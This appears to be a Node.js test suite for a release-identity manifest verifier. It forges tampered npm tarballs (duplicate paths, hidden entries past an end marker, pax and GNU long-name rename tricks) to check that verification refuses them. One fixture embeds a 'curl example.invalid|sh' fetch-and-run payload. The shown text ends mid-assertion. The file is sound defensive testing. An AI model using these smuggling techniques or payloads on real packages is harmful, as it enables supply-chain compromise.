#!/usr/bin/env node
/**
 * Behaviour test for the release identity manifest (`release-identity.mjs`).
 *
 * The manifest is the only artifact that maps a published npm closure back to the commit it was
 * built from, and the only thing that makes it worth anything is that a THIRD PARTY can refute it.
 * So the script is driven end-to-end here inside a THROWAWAY GIT REPO (real commits, real annotated
 * tags) with the real script COPIED into it, so its repo root resolves to the fixture, against a
 * directory of REAL tarballs this file builds byte-by-byte (a minimal ustar writer + gzip). No
 * test-only flag or seam exists in the script itself, and nothing here reaches a network.
 *
 * The properties, each a real failure mode:
 *
 *   (B) AN ALTERED TARBALL BYTE FAILS VERIFICATION — the case is isolated on purpose: the tarball is
 *       re-gzipped at another compression level, so its UNPACKED CONTENT is identical and only the
 *       archive bytes moved. Nothing but the recorded tarball integrity can catch that.
 *   (F) AN ALTERED FILE LIST FAILS VERIFICATION — isolated the other way: the tampering is done to
 *       the LAUNCHER, the one member whose tarball integrity is deliberately NOT recorded (see (X)),
 *       so only the unpacked file-list digest is left to catch it. A launcher that records no
 *       integrity must not thereby become the one package nobody can check.
 *   (X) THE SELF-REFERENCE HOLDS — the manifest ships INSIDE the launcher tarball, so the launcher
 *       cannot record its own tarball integrity: the fixed point does not exist. What IS invariant
 *       is the launcher's file list with the manifest entry excluded, and this pins exactly that —
 *       embedding the manifest leaves verification green, and the run reports that the tarball
 *       carries THESE bytes. Embedding a DIFFERENT manifest is red: the exclusion must not become a
 *       hole an attacker can post anything through.
 *   (D) A DUPLICATE ENTRY PATH IS REFUSED — the general form of the substitution (X) forbids: the
 *       genuine manifest first, a forged one second. Extraction keeps the LAST entry, the file-list
 *       digest excludes BOTH, so a reader that tolerated the duplicate would compare bytes nobody
 *       installs. Pinned on the launcher, the one member that records no tarball integrity.
 *   (T) CONTENT PAST THE END-OF-ARCHIVE MARKER IS REFUSED — tar's marker is two zero blocks, but
 *       `tar` and the node-tar `npm i` runs treat a LONE zero block as a warning and keep reading,
 *       so an entry appended after one is what gets installed. A reader that stopped there would
 *       hash one archive while the consumer receives another.
 *   (E) A PAX RENAME THE READERS DO NOT AGREE ON IS REFUSED — an entry's name may be overridden by a
 *       pax header, and this reader applies one only where every consumer applies the same one. A
 *       GLOBAL header's `path=` (which node-tar and libarchive ignore, so extraction keeps the
 *       entry's real name) is refused; a `path=` smuggled inside another record's value is refused
 *       when the length-framed and line-scanned readings name different files — including the shape
 *       node-tar really honours, inserted BEFORE an existing entry so that no digest moves and the
 *       disagreement is the entire tamper; a pax `size`, which moves an entry's END and can swallow
 *       the entry behind it, is applied the way both readers apply it, so the swallowed file shows up
 *       as the file-list change it is, while a `size` preceding another HEADER is refused; a GNU
 *       long-name block whose body the readers terminate differently (a NUL, then a newline) is
 *       refused, spliced before an entry that already exists so the entry list never moves; the
 *       header a packer really emits is READ, with a colliding entry behind it so a dropped rename
 *       cannot pass; a prefix field under non-ustar magic is refused, the cheapest tamper of the set
 *       (one header rewritten in place, every digest unchanged, the installer writing elsewhere); and
 *       a `..` segment that escapes `package/` is refused, as a file and as a directory. All of them
 *       are the same fault: the reader must not name — or delimit — an entry differently from the
 *       installer, least of all at the excluded manifest path.
 *   (H) A BODY NO INSTALLER READS CANNOT HIDE ENTRIES — tar gives a DIRECTORY no body, and node-tar
 *       enforces that by zeroing the size (and by reclassifying a regular entry whose name ends in
 *       '/' as a directory), so bytes behind such a header are parsed as the next ENTRIES and
 *       installed. A reader that believed the declared size would consume them as opaque content and
 *       record nothing: the file list is unchanged, every digest still matches, and the package's own
 *       files are attacker-chosen. This is the one shape here that substitutes CONTENT rather than
 *       misplacing it, so both costumes are refused, as is a prefix field ending in '/', an empty
 *       prefix in the wide byte-475 branch (node-tar prepends a bare '/' there, making the path
 *       absolute), and an EMPTY NAME FIELD — node-tar classifies from the name field before the
 *       prefix join, so an empty one stays a file and writes 0 bytes at the prefix's path, emptying
 *       a certified file while the reader sees a directory and records nothing.
 *   (S) THE DIGESTS ARE THE ONES THE MANIFEST ADVERTISES — recomputed here with node:crypto rather
 *       than read back from the script, because the manifest's most externally-checkable promise is
 *       that `openssl dgst -sha512` reproduces a recorded integrity. Swapping the hash inside the
 *       script while keeping the `sha512-` label left every other case green.
 *   (A) THE SOURCE HALF OF VERIFICATION IS REAL — a manifest carrying a wrong digest for a
 *       checked-in artifact fails against the very checkout it names. Forcing `comparable = false`
 *       used to leave the suite green, i.e. that half was decorative.
 *   (Y) ONE PACKAGE, TWO TARBALLS IS AMBIGUOUS — a stray second copy of a member refuses instead of
 *       letting readdir order decide which one the closure records.
 *   (O) A VALUE-TAKING FLAG WITH NO VALUE REFUSES — `--out` with nothing after it used to fall back
 *       to the default path, so a mistyped command wrote somewhere nobody asked for and exited 0.
 *   (Q) THE DOCUMENTED RELEASE SEQUENCE REPEATS — the manifest is gitignored and listed in the
 *       launcher's `files`, so it SURVIVES a release run and the next pack would ship the previous
 *       run's manifest. Running the sequence twice (with the removal step it prescribes) is green
 *       both times; skipping that step is a refusal that names it, not an unverifiable release.
 *   (R) THE MANIFEST REPRODUCES FROM THE SAME INPUTS — two runs over the same checkout and the same
 *       tarballs produce byte-identical manifests. A manifest carrying a timestamp or an unordered
 *       map cannot be re-derived by anyone, which is the whole point of it.
 *   (K) THE CONTENT DIGEST SURVIVES A RE-PACK — `pnpm pack` rewrites `workspace:*` into the packed
 *       `package.json` and does NOT emit that map in a stable key order (measured on this repo: two
 *       consecutive `--pack` runs of one commit moved 9, 11, 12 and 12 of the 29 tarballs across
 *       four pairs, the difference confined every time to that file's key order). The file-list
 *       digest canonicalises `package.json` for that reason, so it identifies the package across
 *       packs while the tarball integrity — which identifies one artifact, not a build — moves.
 *   (N) NOTHING IS FABRICATED — before the release tag exists the tag is recorded as absent with a
 *       reason, and outside GitHub Actions the workflow run is an explicit null with a reason. With
 *       the annotated tag on HEAD and an Actions environment present, both are recorded for real.
 *   (W) A DIRTY WORKING TREE IS RECORDED, NOT HIDDEN — a modified tracked file makes the manifest
 *       say so and name the path. A release identity that quietly claims a clean tree is a lie.
 *   (G) AND NEITHER IS A GIT FAILURE — when `git diff` cannot answer (here: a `required` clean
 *       filter whose binary is absent, the everyday form being a missing git-lfs), its empty output
 *       looks exactly like a clean tree. Generation refuses instead of writing the flattering value.
 *   (C) AN INCOMPLETE CLOSURE IS NOT A CLOSURE — a directory missing a package that another member
 *       depends on refuses instead of emitting a manifest that describes most of a release.
 *   (Z) NEITHER MODE TOUCHES THE PACKAGE MANAGER — generating and verifying are pure file reads.
 *       Every child runs with a stub `pnpm`/`npm` FIRST on PATH, the publish gate armed and the
 *       registry pointed at an unroutable address, and `run()` asserts the stub log stayed empty on
 *       EVERY launch — enforced where children are started, so no case can forget it or, because the
 *       log is truncated per run, silently discard the evidence.
 *
 * Standalone (no test framework is wired for the repo scripts): `node <thisfile>`; exit 0 = pass.
 */
import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import { createHash } from 'node:crypto';
import {
  chmodSync,
  copyFileSync,
  existsSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  rmSync,
  writeFileSync,
} from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { gzipSync } from 'node:zlib';

const SCRIPT = join(dirname(fileURLToPath(import.meta.url)), 'release-identity.mjs');
const VERSION = '1.6.2';
const NODE_ENGINE = '>=22';
const PACKAGE_MANAGER = 'pnpm@10.12.4';
const LAUNCHER = 'rayspec';
const MANIFEST_NAME = 'rayspec-release-identity.json';
// The checked-in artifacts the manifest digests, at the paths the script reads them from.
const SOURCE_FILES = [
  'packages/kernel/spec/version-1.0.schema.json',
  'packages/kernel/spec/spec.schema.json',
  'packages/kernel/spec/product.schema.json',
  'pnpm-lock.yaml',
  'docs/dependency-sbom.json',
];

// ── the package-manager test double ─────────────────────────────────────────────────────────────
// Logs one line per invocation and succeeds. Its log staying EMPTY is the assertion: neither mode
// of this script has any business starting a package manager.
const FAKE_PM = `#!/usr/bin/env node
import { appendFileSync } from 'node:fs';
appendFileSync(process.env.FAKE_PM_LOG, JSON.stringify(process.argv.slice(2)) + '\\n');
`;

/**
 * The fixture closure in miniature, with the real shape that matters: the launcher reaches every
 * other member over internal production dependencies, and two members declare MORE THAN ONE of them
 * (the only packages whose packed dependency map has a key order that can move — see (K)).
 */
const MEMBERS = [
  { name: 'rayspec', deps: ['@rayspec/cli'] },
  { name: '@rayspec/cli', deps: ['@rayspec/server', '@rayspec/spec'] },
  { name: '@rayspec/server', deps: ['@rayspec/core', '@rayspec/spec'] },
  { name: '@rayspec/core', deps: ['@rayspec/spec'] },
  { name: '@rayspec/spec', deps: [] },
];

const workspaces = [];

// ── a minimal ustar writer ──────────────────────────────────────────────────────────────────────
// Enough of the format for what an npm tarball actually is: regular files, short paths, one fixed
// mtime so a fixture tarball is a pure function of its contents.

/**
 * One 512-byte ustar header plus the padded body; `type` defaults to a regular file. `declared`
 * overrides the size FIELD without changing the bytes that follow — the way a header can claim a
 * body a reader should not believe.
 */
function tarEntry(path, body, type = '0', declared = body.length) {
  const head = Buffer.alloc(512);
  const put = (s, off, len) => head.write(s.slice(0, len), off, 'utf8');
  put(path, 0, 100);
  put('0000644\0', 100, 8); // mode
  put('0000000\0', 108, 8); // uid
  put('0000000\0', 116, 8); // gid
  put(`${declared.toString(8).padStart(11, '0')}\0`, 124, 12);
  put('00000000000\0', 136, 12); // mtime, fixed
  head.fill(' ', 148, 156); // the checksum field reads as spaces while the checksum is summed
  put(type, 156, 1); // typeflag
  put('ustar\0', 257, 6);
  put('00', 263, 2);
  let sum = 0;
  for (const byte of head) sum += byte;
  put(`${sum.toString(8).padStart(6, '0')}\0 `, 148, 8);
  return Buffer.concat([head, body, Buffer.alloc((512 - (body.length % 512)) % 512)]);
}

/** One well-formed pax record `"<len> <key>=<value>\n"`, `len` counting the whole record. */
function paxRecord(key, value) {
  const tail = ` ${key}=${value}\n`;
  let len = tail.length + 1;
  while (`${len}`.length + tail.length !== len) len = `${len}`.length + tail.length;
  return Buffer.from(`${len}${tail}`, 'utf8');
}

/** A gzipped tar of `[path, contents]` pairs, terminated by the two empty blocks the format wants. */
function tarball(files, { level = 9 } = {}) {
  const blocks = files.map(([p, b]) => tarEntry(p, Buffer.isBuffer(b) ? b : Buffer.from(b)));
  return gzipSync(Buffer.concat([...blocks, Buffer.alloc(1024)]), { level });
}

/** The unpacked entries of one member's tarball, as `pnpm pack` lays them out under `package/`. */
function memberFiles(member, { reverseDeps = false, extra = [] } = {}) {
  const deps = reverseDeps ? [...member.deps].reverse() : member.deps;
  const manifest = {
    name: member.name,
    version: VERSION,
    private: false,
    files: ['dist'],
    engines: { node: NODE_ENGINE },
    dependencies: Object.fromEntries(deps.map((d) => [d, VERSION])),
  };
  return [
    ['package/package.json', `${JSON.stringify(manifest, null, 2)}\n`],
    ['package/dist/index.js', `export const name = '${member.name}';\n`],
    ['package/README.md', `# ${member.name}\n`],
    ...extra,
  ];
}

const tarballName = (name) => `${name.replace('@', '').replace('/', '-')}-${VERSION}.tgz`;

/** Read-only-safe git in the fixture, with an identity and signing forced off (host config varies). */
function gitIn(root, ...args) {
  const res = spawnSync(
    'git',
    [
      '-c',
      'user.email=fixture@rayspec.test',
      '-c',
      'user.name=Release Fixture',
      '-c',
      'commit.gpgsign=false',
      '-c',
      'tag.gpgSign=false',
      ...args,
    ],
    { cwd: root, encoding: 'utf8' },
  );
  assert.equal(res.status, 0, `git ${args.join(' ')} failed: ${res.stderr}`);
  return (res.stdout ?? '').trim();
}

/**
 * Build a throwaway repo carrying everything the manifest digests (the three schema artifacts, the
 * lockfile, the dependency SBOM, the launcher manifest), the REAL script, a `tarballs/` directory
 * holding one tarball per member, and the requested annotated tags.
 */
function fixture({ tags = [], reverseDeps = false, only = null } = {}) {
  const root = mkdtempSync(join(tmpdir(), 'rayspec-release-identity-'));
  workspaces.push(root);

  const write = (rel, contents) => {
    mkdirSync(join(root, dirname(rel)), { recursive: true });
    writeFileSync(join(root, rel), contents);
  };

  mkdirSync(join(root, 'scripts'), { recursive: true });
  copyFileSync(SCRIPT, join(root, 'scripts', 'release-identity.mjs'));
  write(
    'package.json',
    `${JSON.stringify(
      {
        name: 'rayspec',
        version: VERSION,
        private: true,
        packageManager: PACKAGE_MANAGER,
        engines: { node: NODE_ENGINE },
      },
      null,
      2,
    )}\n`,
  );
  write(
    'packages/app/rayspec/package.json',
    `${JSON.stringify({ name: LAUNCHER, version: VERSION, private: true }, null, 2)}\n`,
  );
  for (const rel of SOURCE_FILES) write(rel, `contents of ${rel}\n`);

  gitIn(root, 'init', '-b', 'main');
  gitIn(root, 'add', '-A');
  gitIn(root, 'commit', '-m', 'release candidate');
  for (const t of tags) gitIn(root, 'tag', '-a', t, '-m', `release ${t}`);

  const tarDir = join(root, 'tarballs');
  mkdirSync(tarDir);
  for (const m of MEMBERS) {
    if (only && !only.includes(m.name)) continue;
    writeFileSync(join(tarDir, tarballName(m.name)), tarball(memberFiles(m, { reverseDeps })));
  }

  const stubs = join(root, 'stub-bin');
  mkdirSync(stubs);
  for (const bin of ['pnpm', 'npm']) {
    writeFileSync(join(stubs, bin), FAKE_PM);
    chmodSync(join(stubs, bin), 0o755);
  }
  return { root, tarDir, stubs, head: gitIn(root, 'rev-parse', 'HEAD') };
}

/**
 * Drive the REAL script inside the fixture. The package manager is shadowed on PATH, the publish
 * gate is armed and the registry points at an unroutable address — so a package-manager call would
 * be recorded by the stub and a registry call could not complete even if the stub were bypassed.
 *
 * (Z) is asserted HERE, on every launch, rather than case by case: the log is truncated per run, so
 * a case that forgot to check it would discard its own evidence and the property would quietly hold
 * for fewer runs than the suite claims. Enforcing it in the one place that starts a child makes the
 * claim structural — every child this file ever starts is covered, including ones added later.
 */
function run(fx, args, { env = {} } = {}) {
  const log = join(fx.root, 'pm-calls.log');
  writeFileSync(log, '');
  const res = spawnSync('node', [join(fx.root, 'scripts', 'release-identity.mjs'), ...args], {
    cwd: fx.root,
    encoding: 'utf8',
    env: {
      ...process.env,
      PATH: `${fx.stubs}:${process.env.PATH}`,
      FAKE_PM_LOG: log,
      npm_config_registry: 'http://127.0.0.1:1/',
      RAYSPEC_ALLOW_PUBLISH: '1',
      GITHUB_ACTIONS: '',
      ...env,
    },
  });
  const calls = readFileSync(log, 'utf8').split('\n').filter(Boolean);
  assert.deepEqual(
    calls,
    [],
    `(Z) neither mode may invoke a package manager, but \`${args.join(' ')}\` did: ${JSON.stringify(calls)}`,
  );
  return { code: res.status, out: res.stdout ?? '', err: res.stderr ?? '', calls };
}

/** Generate into the fixture's default location and return the parsed manifest plus its bytes. */
function generate(fx, args = [], opts = {}) {
  const r = run(fx, ['--tarballs', fx.tarDir, ...args], opts);
  assert.equal(r.code, 0, `generate must succeed; got ${r.code}: ${r.err}`);
  const path = join(fx.root, 'packages/app/rayspec', MANIFEST_NAME);
  const bytes = readFileSync(path);
  return { ...r, path, bytes, manifest: JSON.parse(bytes.toString('utf8')) };
}

const verify = (fx, args = [], opts = {}) =>
  run(fx, ['--verify', '--tarballs', fx.tarDir, ...args], opts);
const entryFor = (manifest, name) => manifest.closure.find((m) => m.name === name);

try {
  // ── (R) + the manifest's content: two runs over the same inputs agree to the byte ──────────────
  {
    const fx = fixture();
    const first = generate(fx);
    const second = generate(fx);
    assert.ok(
      first.bytes.equals(second.bytes),
      '(R) two runs over the same checkout and tarballs must produce byte-identical manifests',
    );

    const m = first.manifest;
    assert.equal(m.version, VERSION, `(R) the release version must be recorded: ${m.version}`);
    assert.equal(m.source.commit, fx.head, '(R) the source commit must be the checkout HEAD');
    assert.equal(m.runtime.node, NODE_ENGINE, '(R) the Node requirement must be recorded');
    assert.equal(
      m.runtime.package_manager,
      PACKAGE_MANAGER,
      '(R) the pnpm requirement must be recorded',
    );
    assert.deepEqual(
      m.closure.map((e) => e.name).sort(),
      MEMBERS.map((e) => e.name).sort(),
      `(R) every closure member must be recorded: ${m.closure.map((e) => e.name)}`,
    );
    for (const rel of SOURCE_FILES) {
      const recorded = [...m.schemas, m.lockfile, m.dependency_sbom].find((a) => a.path === rel);
      assert.ok(recorded, `(R) ${rel} must carry a digest in the manifest`);
      assert.match(recorded.sha256, /^[0-9a-f]{64}$/, `(R) ${rel} must carry a sha256`);
    }
    // The algorithm names must be IN the manifest: a third party has to reproduce a digest without
    // reading this repository's scripts.
    for (const key of [
      'tarball_integrity',
      'file_digest',
      'file_list_digest',
      'source_file_digest',
    ])
      assert.match(
        m.algorithms[key] ?? '',
        /sha(256|512)/,
        `(R) algorithms.${key} must state its hash function`,
      );
    console.log('ok (R) — the manifest is a pure function of the checkout and the tarballs');
  }

  // ── (K) the file-list digest survives a re-pack; the tarball integrity legitimately does not ───
  {
    const straight = generate(fixture());
    const reordered = generate(fixture({ reverseDeps: true }));
    const multiDep = MEMBERS.filter((m) => m.deps.length > 1).map((m) => m.name);
    assert.ok(multiDep.length > 0, '(K) the fixture must carry a member with two internal deps');
    for (const name of multiDep) {
      const a = entryFor(straight.manifest, name);
      const b = entryFor(reordered.manifest, name);
      assert.notEqual(
        a.tarball.integrity,
        b.tarball.integrity,
        `(K) ${name}: a re-pack that moves the dependency key order does change the tarball bytes`,
      );
      assert.equal(
        a.files.list_digest,
        b.files.list_digest,
        `(K) ${name}: the file-list digest must identify the package across that re-pack`,
      );
    }
    console.log('ok (K) — the content digest is stable across a re-pack, the byte digest is not');
  }

  // ── (P) the positive control: an untouched tarball directory verifies ──────────────────────────
  {
    const fx = fixture();
    generate(fx);
    const r = verify(fx);
    assert.equal(r.code, 0, `(P) an untouched directory must verify; got ${r.code}: ${r.err}`);
    console.log('ok (P) — the manifest verifies against the tarballs it was generated from');
  }

  // ── (B) one altered tarball BYTE — identical contents, different archive — fails ───────────────
  {
    const fx = fixture();
    generate(fx);
    const victim = '@rayspec/core';
    writeFileSync(
      join(fx.tarDir, tarballName(victim)),
      tarball(memberFiles(MEMBERS.find((m) => m.name === victim)), { level: 1 }),
    );
    const r = verify(fx);
    assert.notEqual(r.code, 0, `(B) an altered tarball must fail verification; got ${r.code}`);
    assert.match(r.err, /@rayspec\/core/, `(B) the failing package must be named: ${r.err}`);
    assert.match(r.err, /integrity/i, `(B) the failing check must be named: ${r.err}`);
    console.log('ok (B) — a tarball whose bytes moved fails, even with identical contents');
  }

  // ── (F) one altered FILE LIST fails — on the member that records no tarball integrity ──────────
  {
    const fx = fixture();
    generate(fx);
    const launcher = MEMBERS.find((m) => m.name === LAUNCHER);
    writeFileSync(
      join(fx.tarDir, tarballName(LAUNCHER)),
      tarball(
        memberFiles(launcher, { extra: [['package/dist/extra.js', 'export const x = 1;\n']] }),
      ),
    );
    const r = verify(fx);
    assert.notEqual(r.code, 0, `(F) an altered file list must fail verification; got ${r.code}`);
    assert.match(r.err, /rayspec/, `(F) the failing package must be named: ${r.err}`);
    assert.match(r.err, /file/i, `(F) the failing check must be named: ${r.err}`);
    console.log(
      'ok (F) — a file added to the launcher fails, though it records no tarball integrity',
    );
  }

  // ── (X) the self-reference: the manifest inside the launcher tarball, and only that manifest ───
  {
    const fx = fixture();
    const generated = generate(fx);
    const launcher = MEMBERS.find((m) => m.name === LAUNCHER);
    const entry = entryFor(generated.manifest, LAUNCHER);
    assert.equal(
      entry.tarball.integrity,
      null,
      '(X) the launcher must not claim a tarball integrity the shipped tarball cannot have',
    );
    assert.ok(
      entry.tarball.reason,
      '(X) the absent integrity must carry a machine-readable reason',
    );
    assert.deepEqual(
      entry.files.excluded,
      [MANIFEST_NAME],
      `(X) the launcher must exclude exactly the manifest: ${JSON.stringify(entry.files.excluded)}`,
    );

    // Ship it: the launcher tarball now carries the manifest, which is how a consumer receives it.
    writeFileSync(
      join(fx.tarDir, tarballName(LAUNCHER)),
      tarball(memberFiles(launcher, { extra: [[`package/${MANIFEST_NAME}`, generated.bytes]] })),
    );
    const shipped = verify(fx);
    assert.equal(
      shipped.code,
      0,
      `(X) embedding the manifest must leave verification green; got ${shipped.code}: ${shipped.err}`,
    );
    assert.match(
      shipped.out,
      /carries/i,
      `(X) the run must report that the launcher carries the manifest: ${shipped.out}`,
    );

    // And the exclusion must not be a hole: a DIFFERENT manifest inside the launcher is red.
    const forged = JSON.parse(generated.bytes.toString('utf8'));
    forged.source.commit = '0'.repeat(40);
    writeFileSync(
      join(fx.tarDir, tarballName(LAUNCHER)),
      tarball(
        memberFiles(launcher, {
          extra: [[`package/${MANIFEST_NAME}`, `${JSON.stringify(forged, null, 2)}\n`]],
        }),
      ),
    );
    const swapped = verify(fx);
    assert.notEqual(
      swapped.code,
      0,
      '(X) a launcher carrying a DIFFERENT manifest must fail verification',
    );
    assert.match(
      swapped.err,
      new RegExp(MANIFEST_NAME),
      `(X) the mismatch must name it: ${swapped.err}`,
    );
    console.log('ok (X) — the launcher is verifiable from the manifest it ships');
  }

  // ── (D) two entries at one path — the genuine manifest, then a forged one — is refused ─────────
  {
    const fx = fixture();
    const generated = generate(fx);
    const launcher = MEMBERS.find((m) => m.name === LAUNCHER);
    const forged = JSON.parse(generated.bytes.toString('utf8'));
    forged.version = '9.9.9';
    forged.source.commit = '0'.repeat(40);
    // Both copies sit at the excluded path, so the file-list digest skips both; extraction keeps the
    // SECOND. Only refusing the duplicate outright makes the byte comparison mean anything.
    writeFileSync(
      join(fx.tarDir, tarballName(LAUNCHER)),
      tarball([
        ...memberFiles(launcher),
        [`package/${MANIFEST_NAME}`, generated.bytes],
        [`package/${MANIFEST_NAME}`, `${JSON.stringify(forged, null, 2)}\n`],
      ]),
    );
    const r = verify(fx);
    assert.notEqual(
      r.code,
      0,
      `(D) a duplicate entry path must be refused; got ${r.code}: ${r.out}`,
    );
    assert.match(r.err, /duplicate entry path/i, `(D) the refusal must name it: ${r.err}`);
    assert.match(r.err, new RegExp(MANIFEST_NAME), `(D) the path must be named: ${r.err}`);
    console.log('ok (D) — a second entry at an excluded path is refused, not silently skipped');
  }

  // ── (T) an entry hidden behind a lone null block — what npm installs — is refused ──────────────
  {
    const fx = fixture();
    generate(fx);
    const launcher = MEMBERS.find((m) => m.name === LAUNCHER);
    const blocks = memberFiles(launcher).map(([p, b]) => tarEntry(p, Buffer.from(b)));
    writeFileSync(
      join(fx.tarDir, tarballName(LAUNCHER)),
      gzipSync(
        Buffer.concat([
          ...blocks,
          Buffer.alloc(512), // a LONE zero block: tar warns and reads on, npm installs what follows
          tarEntry(
            'package/dist/index.js',
            Buffer.from("require('child_process').exec('curl example.invalid|sh');\n"),
          ),
          Buffer.alloc(1024),
        ]),
      ),
    );
    const r = verify(fx);
    assert.notEqual(
      r.code,
      0,
      `(T) content past the marker must be refused; got ${r.code}: ${r.out}`,
    );
    assert.match(r.err, /end-of-archive marker/i, `(T) the refusal must name it: ${r.err}`);
    console.log('ok (T) — an archive whose tail only tar would read is refused, not half-read');
  }

  // ── (E) pax headers: the renames and boundary moves the readers do not agree on, and one they do ─
  {
    const fx = fixture();
    const generated = generate(fx);
    const launcher = MEMBERS.find((m) => m.name === LAUNCHER);
    const base = memberFiles(launcher).map(([p, b]) => tarEntry(p, Buffer.from(b)));
    const ship = (blocks) =>
      writeFileSync(
        join(fx.tarDir, tarballName(LAUNCHER)),
        gzipSync(Buffer.concat([...blocks, Buffer.alloc(1024)])),
      );

    // (a) a GLOBAL pax header renaming the next entry to the excluded manifest path. node-tar and
    // libarchive ignore `path` from a global header — they would extract the entry under its real
    // name — so honouring it here would record a manifest at a path no installer writes.
    ship([
      ...base,
      tarEntry('pax_global_header', paxRecord('path', `package/${MANIFEST_NAME}`), 'g'),
      tarEntry('package/dist/renamed.js', generated.bytes),
    ]);
    const global = verify(fx);
    assert.notEqual(global.code, 0, `(E) a global-pax rename must be refused; got ${global.code}`);
    assert.match(global.err, /global header/i, `(E) the refusal must name it: ${global.err}`);

    // (b) a `path=` smuggled inside another record's VALUE. A line scan would honour the inner line;
    // a length-prefixed parse reads it as value bytes, so the entry keeps its declared name and can
    // never land at the excluded path — the run must not report the launcher as carrying a manifest.
    ship([
      ...base,
      tarEntry('PaxHeader', paxRecord('comment', `x\n30 path=package/${MANIFEST_NAME}`), 'x'),
      tarEntry('package/dist/decoy.js', generated.bytes),
    ]);
    const smuggled = verify(fx);
    assert.notEqual(
      smuggled.code,
      0,
      `(E) a smuggled pax path must not verify; got ${smuggled.code}`,
    );
    assert.doesNotMatch(
      smuggled.out,
      /carries this/i,
      `(E) a smuggled path must not be read as the manifest entry: ${smuggled.out}`,
    );

    // (d) the record node-tar DOES honour, inserted BEFORE AN EXISTING ENTRY. The inner line is a
    // well-formed record in its own right, so node-tar's line scan renames the entry it precedes
    // while a length-framed reader sees one `comment` record and no rename. Nothing is added,
    // removed or reordered, so the entry list — and therefore every digest recorded for this
    // member — is byte-identical to the clean archive: only the disagreement itself is the tamper.
    // Reading it either way would report the launcher verified while npm installs different files,
    // so the run must refuse.
    const honoured = paxRecord('path', `package/${MANIFEST_NAME}`).toString('utf8').slice(0, -1);
    const [firstEntry, ...restEntries] = base;
    ship([
      firstEntry,
      tarEntry('PaxHeader', paxRecord('comment', `x\n${honoured}`), 'x'),
      ...restEntries,
    ]);
    const disagreeing = verify(fx);
    assert.notEqual(
      disagreeing.code,
      0,
      `(E) a pax header the readers name differently must be refused; got ${disagreeing.code}`,
    );
    assert.match(
      disagreeing.err,
      /records and its lines name differently/i,
      `(E) the refusal must name the disagreement: ${disagreeing.err}`,
    );

    // (e) a pax `size` record, which moves the END of one entry and therefore the START of the next.
    // node-tar copies every pax key onto the entry header, so a size that covers the following block
    // swallows that entry whole: the installer writes one file fewer. A reader that IGNORED the
    // record would still see the swallowed entry and would certify a file list nobody receives.
    // Reading the record the way both node-tar and libarchive do puts the tamper back where it can
    // be caught — as the file-list digest it changes.
    const [firstBlock, secondBlock, ...tailBlocks] = base;
    const firstContent = firstBlock.length - 512; // the padded content of the entry that swallows
    ship([
      tarEntry('PaxHeader', paxRecord('size', firstContent + secondBlock.length), 'x'),
      firstBlock,
      secondBlock,
      ...tailBlocks,
    ]);
    const swallowed = verify(fx);
    assert.notEqual(
      swallowed.code,
      0,
      `(E) an entry swallowed by a pax size must not verify; got ${swallowed.code}`,
    );

    // (f) THE OTHER DIRECTION — a header a packer really emits must be READ, not refused. The
    // records above are what node-tar 6.2.1 writes for a path too long for a ustar header, in its
    // order, `size` included; only `path` and `size` change what a reader does, and both are
    // modelled. Without this arm the refusals above could tighten until a genuine long-path archive
    // stopped verifying and nothing would go red.
    const longName = `package/dist/${'q'.repeat(140)}.js`;
    const longBody = Buffer.from('export const q = 1;\n');
    ship([
      ...base,
      tarEntry(
        'PaxHeader',
        Buffer.concat([
          paxRecord('path', longName),
          paxRecord('ctime', '1785675205.956'),
          paxRecord('atime', '1785675205.956'),
          paxRecord('SCHILY.dev', '16777232'),
          paxRecord('SCHILY.ino', '508639210'),
          paxRecord('SCHILY.nlink', '1'),
          paxRecord('mtime', '1785675205.956'),
          paxRecord('size', `${longBody.length}`),
          paxRecord('uid', '501'),
          paxRecord('uname', 'philipp'),
        ]),
        'x',
      ),
      tarEntry('package/dist/truncated-name.js', longBody),
      // A real entry at the un-renamed path. It is what makes this arm DISCRIMINATING: if the
      // rename were silently dropped rather than applied, both entries would land on
      // `dist/truncated-name.js` and the run would refuse as a duplicate path instead of reporting
      // the file-list mismatch asserted below — so a reader that stopped honouring a legitimate
      // pax rename could not pass this case.
      tarEntry('package/dist/truncated-name.js', Buffer.from('export const t = 2;\n')),
    ]);
    const packerPax = verify(fx);
    assert.match(
      packerPax.out + packerPax.err,
      /file-list digest/i,
      `(E) a packer-emitted pax header must be READ (and its added file caught by the file list), not refused: ${packerPax.err || packerPax.out}`,
    );
    assert.doesNotMatch(
      packerPax.err,
      /pax/i,
      `(E) a packer-emitted pax header must not be refused as a pax fault: ${packerPax.err}`,
    );

    // (g) a GNU long-name block whose body the two readers terminate differently. node-tar strips
    // from the first NUL with a pattern that stops at a newline, so a body carrying a NUL and then a
    // newline keeps the tail and names a DIFFERENT file; a reader that strips to the end of the body
    // sees the plain name and certifies green. Like (b)/(d), nothing is added or removed — the
    // entry list this reader records is untouched while the installer writes the entry elsewhere.
    // The block is spliced BEFORE an entry that already exists, and repeats that entry's own name,
    // so a reader that drops the tail names it exactly as the manifest recorded it and reports the
    // launcher verified — nothing added, nothing removed, every digest still matching.
    const [firstBase, secondBase, ...restBase] = base;
    ship([
      firstBase,
      // The trigger is a NUL followed later by a newline: node-tar's terminator stops at the
      // newline and keeps the tail, a strip-to-end terminator drops it.
      tarEntry(
        '././@LongLink',
        Buffer.concat([
          Buffer.from('package/dist/index.js'),
          Buffer.from([0]),
          Buffer.from('\npackage/evil-shim'),
        ]),
        'L',
      ),
      secondBase,
      ...restBase,
    ]);
    const longNameSplit = verify(fx);
    assert.notEqual(
      longNameSplit.code,
      0,
      `(E) a long-name block the readers terminate differently must be refused; got ${longNameSplit.code}`,
    );
    assert.match(
      longNameSplit.err,
      /terminate differently/i,
      `(E) the refusal must name the disagreement: ${longNameSplit.err}`,
    );

    // (h) a pax `size` record that precedes ANOTHER header rather than a file entry. node-tar clears
    // its pending pax state only on the non-meta branch while its header decoder takes `size` from
    // that state unconditionally, so the record sizes the following HEADER for the installer and not
    // for a reader that frames that header by its own field — and the two part company from there to
    // the end of the archive. Refused rather than modelled: no packer emits it.
    ship([
      ...base,
      tarEntry('PaxHeader', paxRecord('size', '1024'), 'x'),
      tarEntry('././@LongLink', Buffer.from('package/dist/renamed.js '), 'L'),
      tarEntry('package/dist/decoy.js', Buffer.from('export const d = 1;\n')),
    ]);
    const sizeBeforeHeader = verify(fx);
    assert.notEqual(
      sizeBeforeHeader.code,
      0,
